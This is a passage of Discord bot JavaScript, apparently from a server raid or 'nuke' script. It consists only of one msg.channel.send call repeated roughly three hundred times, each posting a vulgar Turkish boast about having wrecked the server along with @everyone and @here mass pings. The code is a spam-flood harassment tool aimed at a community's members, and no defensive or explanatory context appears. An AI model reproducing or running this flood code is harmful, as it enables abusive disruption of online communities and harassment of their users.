    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
     msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
